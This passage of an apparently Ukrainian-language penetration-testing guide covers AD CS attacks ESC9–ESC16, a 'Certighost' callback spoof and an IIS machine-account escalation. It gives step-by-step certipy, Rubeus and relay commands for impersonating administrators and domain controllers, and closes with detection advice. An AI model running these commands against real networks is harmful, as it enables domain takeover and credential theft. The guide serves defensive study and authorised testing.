Припустімо, що `John@corp.local` має дозволи `GenericWrite` щодо `Jane@corp.local` і прагне скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, у якому `Jane@corp.local` має право реєструватися, налаштовано з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у параметрі `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials завдяки `GenericWrite` користувача `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Згодом значення `userPrincipalName` користувача `Jane` змінюється на `Administrator`, навмисно без частини домену `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця модифікація не порушує обмежень, оскільки `Administrator@corp.local` залишається відмінним від `userPrincipalName` користувача `Administrator`.

Після цього вразливий шаблон сертифіката `ESC9` запитується від імені `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Зазначено, що `userPrincipalName` сертифіката відповідає `Administrator` і не містить жодного “object SID”.

Потім `userPrincipalName` `Jane` повертається до початкового значення, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба автентифікації за допомогою виданого сертифіката тепер повертає NT hash для `Administrator@corp.local`. Команда повинна містити `-domain <domain>` через відсутність у сертифікаті зазначення домену:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Слабкі зіставлення сертифікатів - ESC10

### Пояснення

ESC10 стосується двох значень ключів реєстру на контролері домену:

- Значення за замовчуванням для `CertificateMappingMethods` у `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` — `0x18` (`0x8 | 0x10`), раніше було встановлено `0x1F`.
- Налаштування за замовчуванням для `StrongCertificateBindingEnforcement` у `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` — `1`, раніше було `0`.<sup>[[7]](#references)</sup>

**Випадок 1**

Коли `StrongCertificateBindingEnforcement` налаштовано як `0`.

**Випадок 2**

Якщо `CertificateMappingMethods` містить біт `UPN` (`0x4`).

### Випадок експлуатації 1

Якщо `StrongCertificateBindingEnforcement` налаштовано як `0`, обліковий запис A із дозволами `GenericWrite` можна використати для компрометації будь-якого облікового запису B.

Наприклад, маючи дозволи `GenericWrite` для `Jane@corp.local`, attacker має на меті скомпрометувати `Administrator@corp.local`. Процедура аналогічна ESC9, тому можна використати будь-який шаблон сертифіката.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Після цього `userPrincipalName` користувача `Jane` змінюється на `Administrator`, навмисно опускаючи частину `@corp.local`, щоб уникнути порушення обмеження.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Після цього сертифікат, що дає змогу автентифікацію клієнта, запитується як `Jane` за допомогою стандартного шаблону `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` потім повертається до початкового значення — `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Автентифікація за допомогою отриманого сертифіката дасть NT-хеш `Administrator@corp.local`, тому в команді необхідно вказати домен через відсутність інформації про домен у сертифікаті.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Сценарій зловживання 2

Якщо `CertificateMappingMethods` містить бітовий прапорець `UPN` (`0x4`), обліковий запис A із дозволами `GenericWrite` може скомпрометувати будь-який обліковий запис B, якому бракує властивості `userPrincipalName`, зокрема облікові записи комп'ютерів і вбудований доменний адміністратор `Administrator`.

Тут мета полягає в компрометації `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Потім `userPrincipalName` користувача `Jane` встановлюється в `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Сертифікат для автентифікації клієнта запитується від імені `Jane` за допомогою стандартного шаблону `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` після цього процесу повертається до початкового значення.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Для автентифікації через Schannel використовується опція `-ldap-shell` у Certipy, що свідчить про успішну автентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Через LDAP shell такі команди, як `set_rbcd`, дають змогу виконувати атаки Resource-Based Constrained Delegation (RBCD), що потенційно може призвести до компрометації контролера домену.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-який обліковий запис користувача, якому бракує `userPrincipalName`, або коли він не відповідає `sAMAccountName`. Обліковий запис `Administrator@corp.local` є основною ціллю через його розширені LDAP-привілеї та відсутність `userPrincipalName` за замовчуванням.

## Ретрансляція NTLM до ICPR - ESC11

### Пояснення

Якщо на CA Server не налаштовано `IF_ENFORCEENCRYPTICERTREQUEST`, можна виконувати атаки NTLM relay без підпису через службу RPC. [Посилання тут](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Ви можете використовувати `certipy`, щоб перевірити, чи вимкнено `Enforce Encryption for Requests`; `certipy` покаже вразливості `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Сценарій зловживання

Потрібно налаштувати relay-сервер:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Примітка: Для контролерів домену потрібно вказати `-template` у DomainController.

Або використовуючи [форк impacket від sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Адміністратори можуть налаштувати Certificate Authority для зберігання на зовнішньому пристрої, наприклад "Yubico YubiHSM2".

Якщо USB-пристрій підключено до CA server через USB-порт або через USB device server, якщо CA server є віртуальною машиною, для Key Storage Provider потрібен ключ автентифікації (іноді його називають "паролем"), щоб генерувати ключі в YubiHSM і використовувати їх.

Цей ключ/пароль зберігається в registry за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.

Посилання наведено [тут](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, після отримання shell access можна відновити ключ.

Спочатку потрібно отримати сертифікат CA (він є відкритим), а потім:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Нарешті, використайте команду `certutil -sign`, щоб підробити новий довільний сертифікат за допомогою сертифіката CA та його приватного ключа.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дає змогу додати політику видачі до шаблону сертифіката. Об'єкти `msPKI-Enterprise-Oid`, відповідальні за видачу політик, можна виявити в Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політику можна пов'язати з AD-групою за допомогою атрибута `msDS-OIDToGroupLink` цього об'єкта, що дає змогу системі авторизувати користувача, який пред'являє сертифікат, так, ніби він є членом цієї групи. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Іншими словами, коли користувач має дозвіл на реєстрацію сертифіката, а сертифікат пов'язаний з OID-групою, користувач може успадкувати привілеї цієї групи.

Використовуйте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Сценарій зловживання

Знайдіть дозвіл користувача, який можна використати за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на enrollment у `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Потрібно лише вказати шаблон — буде отримано сертифікат із правами OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Вразлива конфігурація поновлення сертифікатів — ESC14

### Пояснення

Опис за адресою https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping є надзвичайно детальним. Нижче наведено цитату з оригінального тексту.<sup>[[14]](#references)</sup>

ESC14 стосується вразливостей, що виникають через «слабке явне зіставлення сертифікатів», переважно внаслідок неправильного використання або небезпечної конфігурації атрибута `altSecurityIdentities` облікових записів користувачів або комп’ютерів Active Directory. Цей атрибут із множинними значеннями дає адміністраторам змогу вручну пов’язувати X.509-сертифікати з обліковим записом AD для автентифікації. Якщо такі явні зіставлення задано, вони можуть перевизначити стандартну логіку зіставлення сертифікатів, яка зазвичай покладається на UPN або DNS-імена в SAN сертифіката чи на SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

«Слабке» зіставлення виникає, коли рядкове значення в атрибуті `altSecurityIdentities`, що використовується для ідентифікації сертифіката, є надто широким, легко вгадуваним, базується на неунікальних полях сертифіката або використовує компоненти сертифіката, які легко підробити. Якщо атакувальник може отримати або створити сертифікат, атрибути якого відповідають такому слабко визначеному явному зіставленню привілейованого облікового запису, він може використати цей сертифікат для автентифікації від імені цього облікового запису та його імітації.

Приклади потенційно слабких рядків зіставлення `altSecurityIdentities`:

- Зіставлення лише за загальним Common Name (CN) суб’єкта: наприклад, `X509:<S>CN=SomeUser`. Атакувальник може отримати сертифікат із таким CN із менш захищеного джерела.
- Використання надто загальних Distinguished Names (DN) видавця або суб’єкта без додаткової кваліфікації, наприклад конкретного серійного номера або ідентифікатора ключа суб’єкта: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Використання інших передбачуваних шаблонів або некриптографічних ідентифікаторів, яким атакувальник може відповідати у сертифікаті, що він може легітимно отримати або підробити (якщо він скомпрометував CA або знайшов вразливий template, як у ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати зіставлення, зокрема:

- `X509:<I>IssuerDN<S>SubjectDN` (зіставлення за повними DN видавця та суб’єкта)
- `X509:<SKI>SubjectKeyIdentifier` (зіставлення за значенням розширення Subject Key Identifier сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (зіставлення за серійним номером, неявно кваліфікованим DN видавця) — це не стандартний формат, зазвичай використовується `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (зіставлення за іменем RFC822, зазвичай адресою електронної пошти, із SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (зіставлення за SHA1-хешем необробленого відкритого ключа сертифіката — зазвичай надійний варіант)

Безпека цих зіставлень значною мірою залежить від специфічності, унікальності та криптографічної стійкості вибраних ідентифікаторів сертифіката, використаних у рядку зіставлення. Навіть за ввімкнених на Domain Controllers режимів посиленого прив’язування сертифікатів (які переважно впливають на неявні зіставлення на основі SAN UPN/DNS і розширення SID) неправильно налаштований запис `altSecurityIdentities` все одно може створити прямий шлях до імітації, якщо сама логіка зіставлення є помилковою або надто permissive.

### Сценарій зловживання

ESC14 націлений на **явні зіставлення сертифікатів** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут задано (навмисно або внаслідок помилкової конфігурації), атакувальники можуть імітувати облікові записи, надаючи сертифікати, що відповідають зіставленню.

#### Сценарій A: Атакувальник може записувати до `altSecurityIdentities`

**Попередня умова**: Атакувальник має дозволи на запис до атрибута `altSecurityIdentities` цільового облікового запису або дозвіл надати такий доступ через один із наведених нижче дозволів на цільовому об’єкті AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Сценарій B: Ціль має слабке зіставлення через X509RFC822 (Email)

- **Попередня умова**: Ціль має слабке зіставлення X509RFC822 в altSecurityIdentities. Атакувальник може встановити атрибут mail жертви так, щоб він відповідав імені X509RFC822 цілі, зареєструвати сертифікат від імені жертви та використати його для автентифікації як ціль.

#### Сценарій C: Ціль має зіставлення X509IssuerSubject

- **Попередня умова**: Ціль має слабке явне зіставлення X509IssuerSubject в `altSecurityIdentities`.Атакувальник може встановити атрибут `cn` або `dNSHostName` суб’єкта-жертви так, щоб він відповідав суб’єкту зіставлення X509IssuerSubject цілі. Після цього атакувальник може зареєструвати сертифікат від імені жертви та використати його для автентифікації як ціль.

#### Сценарій D: Ціль має зіставлення X509SubjectOnly

- **Попередня умова**: Ціль має слабке явне зіставлення X509SubjectOnly в `altSecurityIdentities`. Атакувальник може встановити атрибут `cn` або `dNSHostName` суб’єкта-жертви так, щоб він відповідав суб’єкту зіставлення X509SubjectOnly цілі. Після цього атакувальник може зареєструвати сертифікат від імені жертви та використати його для автентифікації як ціль.

### конкретні операції
#### Сценарій A

Запросіть сертифікат за допомогою certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Зберегти та конвертувати сертифікат
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Автентифікуватися (за допомогою сертифіката)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Очищення (необов’язково)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Для більш конкретних методів атак у різних сценаріях атак дивіться: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Пояснення

Опис за адресою https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc є надзвичайно докладним. Нижче наведено цитату з оригінального тексту.<sup>[[15]](#references)</sup>

Використовуючи вбудовані стандартні шаблони сертифікатів версії 1, зловмисник може створити CSR, додавши application policies, які мають пріоритет над налаштованими атрибутами Extended Key Usage, указаними в шаблоні. Єдина вимога — права на enrollment, і це можна використати для створення сертифікатів client authentication, certificate request agent і codesigning за допомогою шаблону **_WebServer_**

### Зловживання

Документація [Certipy privilege-escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) містить докладніші приклади використання.<sup>[[14]](#references)</sup>


Команда `find` у Certipy може допомогти виявити шаблони V1, які потенційно вразливі до ESC15, якщо CA не має встановленого виправлення.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Сценарій A: Пряма імперсонація через Schannel

**Крок 1: Запит сертифіката з ін’єкцією політики застосунку "Client Authentication" і цільового UPN.** Зловмисник `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон "WebServer" V1 (який дозволяє subject, вказаний заявником).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Уразливий шаблон V1 із параметром "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Додає OID `1.3.6.1.5.5.7.3.2` до розширення Application Policies у CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN у SAN для impersonation.

**Крок 2: Автентифікація через Schannel (LDAPS) за допомогою отриманого сертифіката.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Сценарій B: PKINIT/Kerberos Impersonation через зловживання Enrollment Agent

**Крок 1: Запросити сертифікат із шаблону V1 (з параметром "Enrollee supplies subject"), додавши політику застосунку "Certificate Request Agent".** Цей сертифікат призначений для зловмисника (`attacker@corp.local`), щоб він міг стати enrollment agent. Тут для власної ідентичності зловмисника не вказується UPN, оскільки метою є отримання можливості діяти як агент.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використайте сертифікат "agent", щоб запросити сертифікат від імені цільового привілейованого користувача.** Це крок, подібний до ESC3, у якому сертифікат із Кроку 1 використовується як сертифікат агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Крок 3: Автентифікуйтеся як привілейований користувач за допомогою сертифіката "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Пояснення

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** стосується сценарію, за якого, якщо конфігурація AD CS не вимагає включення розширення **szOID_NTDS_CA_SECURITY_EXT** до всіх сертифікатів, зловмисник може скористатися цим, щоб:

1. Запросити сертифікат **без SID binding**.

2. Використати цей сертифікат **для автентифікації як будь-який обліковий запис**, наприклад видаючи себе за обліковий запис із високими привілеями (наприклад, Domain Administrator).

Також можна звернутися до цієї статті, щоб дізнатися більше про детальний принцип:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Експлуатація

Нижче наведено посилання на [цю сторінку](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Натисніть, щоб переглянути докладніші методи використання.<sup>[[14]](#references)</sup>

Щоб визначити, чи є середовище Active Directory Certificate Services (AD CS) вразливим до **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Крок 1: Прочитайте початковий UPN облікового запису жертви (необов’язково — для відновлення).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Крок 2: Змініть UPN облікового запису жертви на `sAMAccountName` цільового адміністратора.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Крок 3: (За потреби) Отримайте облікові дані облікового запису «жертви» (наприклад, через Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Крок 4: Запросіть сертифікат як користувач «жертва» з _будь-якого придатного шаблону автентифікації клієнта_ (наприклад, «User») на вразливому до ESC16 CA.** Оскільки CA вразливий до ESC16, він автоматично вилучить розширення безпеки SID із виданого сертифіката, незалежно від конкретних налаштувань цього розширення в шаблоні. Встановіть змінну середовища для кешу облікових даних Kerberos (команда shell):
```bash
export KRB5CCNAME=victim.ccache
```
Потім запросіть сертифікат:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Крок 5: Поверніть UPN облікового запису "victim" до початкового значення.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Крок 6: Автентифікуйтеся як цільовий адміністратор.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Підміна ідентичності в callback для Rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Пояснення

**Certighost** зловживає **AD CS enrollment chase / callback path**, де CA довіряє атрибутам запиту, наданим requester, щоб визначити ідентичність, яку слід помістити у виданий сертифікат. У public PoC створений запит містить:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: контрольований attacker-ом host/IP, до якого CA підключиться
- **`rmd`**: **DNS-ім’я цільового Domain Controller**, який потрібно імперсонувати

Якщо CA виконує цей chase, він підключиться до attacker через **SMB/LSA (`445`)** і **LDAP (`389`)**. Attacker використовує **реальний machine account** (зазвичай створений через стандартне значення **`ms-DS-MachineAccountQuota`**), щоб callback-сесія автентифікувалася як дійсний domain principal, але rogue-сервіси повертають натомість атрибути ідентичності **цільового DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Якщо CA **криптографічно не пов’язує повернену ідентичність з автентифікованим callback principal**, він може видати сертифікат для **Domain Controller**, навіть якщо сесія автентифікувалася як machine account, контрольований attacker-ом. Концептуально це відрізняє bug від **Certifried**: замість перезапису AD-атрибутів, таких як `dNSHostName`, attacker **підміняє дані ідентичності під час callback resolution CA**.<sup>[[2]](#references)</sup>

**Корисні передумови:**

- Облікові дані **domain** з низькими привілеями
- Можливість **створити або повторно використати computer account**
- Мережева доступність з **CA** до контрольованих attacker-ом **портів `389` і `445`**
- Уразливий / не пропатчений CA request path (оновлення Microsoft від **14 липня 2026 року** додало **DC validation для `cdc`** разом із **порівнянням resolved SID**)

Отриманий **`.pfx`** можна використати для **PKINIT**, створивши **`.ccache`** і, у flow опублікованого PoC, **NT hash цільового DC**, чого зазвичай достатньо для **повної компрометації домену**.

### Експлуатація

Public PoC автоматизує весь chain:<sup>[[1]](#references)</sup>

1. Створити або повторно використати контрольований attacker-ом **machine account**.
2. Запустити **rogue LDAP і SMB/LSA listeners** на `389` і `445`.
3. Надіслати certificate request, що містить контрольовані attacker-ом атрибути **`cdc`** і цільовий **`rmd`**.
4. Дозволити CA автентифікуватися на rogue listeners як контрольований machine account, але відповісти на identity lookups атрибутами **цільового DC**.
5. Отримати підписаний CA **сертифікат DC**, а потім використати його для **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Корисні runtime-прапори з PoC:

- `--listener <ip>`: явно вибрати IP-адресу callback, рекламовану в `cdc`
- `--computer-name <NAME$>`: повторно використати наявний machine account замість створення нового

**Операційні примітки:**

- PoC потребує **root**, оскільки прив’язується до **привілейованих портів** `389` і `445`.
- У разі успішної експлуатації локально записуються **DC `.pfx`** і **Kerberos `.ccache`**.
- Оскільки сертифікат зіставляється з обліковим записом **Domain Controller**, подальші дії можуть включати **certificate-based Kerberos auth**, **DCSync** і повторне використання отриманого **machine NT hash**.<sup>[[2]](#references)</sup>

## Зарахування machine account IIS AppPool до Administrator на тому самому хості

Пул IIS, що працює як `ApplicationPoolIdentity`, використовує **computer account** свого хоста для вихідного доступу до мережевих ресурсів. Тому виконання коду від імені `IIS AppPool\<POOL>` залишається низькопривілейованим у локальному токені, але може надіслати запит до AD CS, який CA автентифікує як `HOST$`; це outbound identity transition, а не token impersonation або локальне підвищення привілеїв у стилі Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Для цього ланцюжка потрібні host IIS, приєднаний до домену, Enterprise CA, доступний через RPC, опублікований шаблон машинної автентифікації, для якого комп’ютер має права enrollment, підтримка PKINIT, а також доступність KDC/SMB. Власний pool identity змінює outbound principal, тому переконайтеся, що пул справді використовує `ApplicationPoolIdentity`, перш ніж припускати `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment із ключем під контролем атакувальника

Згенеруйте пару ключів і CSR поза IIS-сервером та збережіть private key. Надсилайте з скомпрометованого worker **лише CSR**. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) створює екземпляр `CertificateAuthority.Request`, задає `CertificateTemplate:Machine`, викликає `ICertRequest::Submit` і повертає виданий сертифікат. Використовуйте configuration string CA `CAHOST\CA-NAME`; звичайний шаблон `Machine` формує subject з AD, тому дані subject/SAN, надані requester, не потрібні.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Об’єднайте повернений сертифікат із **відповідним збереженим ключем**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` працює лише тоді, коли Windows уже може пов’язати сертифікат із доступним private key; для окремих PEM-файлів явно створіть PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
Використайте PFX для PKINIT і залиште отриманий TGT комп’ютера у форматі base64 замість негайного інжекту:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self plus заміна сервісу на тому самому хості

S4U2Self дає змогу сервісу отримати ticket **для самого себе**, що містить дані авторизації іншого користувача. Маючи TGT комп'ютера, Rubeus може запросити такий ticket для привілейованого користувача, переписати ім'я сервісу у повернутому KRB-CRED на CIFS і виконати його ін'єкцію. Це локальний примітив “delegate to thyself”: він не потребує S4U2Proxy або запису `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Замінений ticket можна використовувати лише службами на **тому самому обліковому записі/ключі комп’ютера** (у цьому випадку CIFS на `HOST`). Це не придатний для повторного використання Administrator ticket для інших машин домену. Крім того, продемонстрований результат — це привілейований доступ до SMB/файлової системи від імені Administrator; для отримання локального процесу `NT AUTHORITY\SYSTEM` все ще потрібен окремий етап remote execution.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Виявлення та hardening

- На CA зіставляйте події Certification Services **4886** (отримано запит) і **4887** (видано) для неочікуваних запитів шаблону `Machine`, виконаних обліковими записами IIS-серверів.<sup>[[19]](#references)[[24]](#references)</sup>
- На DC подія **4768** містить поля сертифіката, коли використовується certificate pre-authentication; створюйте alert для нетипових запитів PKINIT TGT від імені облікових записів web-серверів. Після цього перевіряйте запити **4769**, пов’язані з привілейованою impersonated identity, і той самий host. Оскільки Rubeus `/altservice` переписує ім’я служби KRB-CRED на стороні client, не слід вимагати, щоб ім’я служби у 4769 на стороні DC було `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Виявляйте випадки, коли `w3wp.exe` звертається до RPC endpoints CA, неочікуване створення ASPX, доступ із Kerberos authentication до administrative shares і активність із secrets-dumping. За можливості обмежте доступ app-tier до CA RPC/KDC/SMB і видаліть права computer enrollment або machine-authentication templates, які не потрібні для роботи.<sup>[[19]](#references)</sup>

## Компрометація Forests за допомогою Certificates у пасивному стані

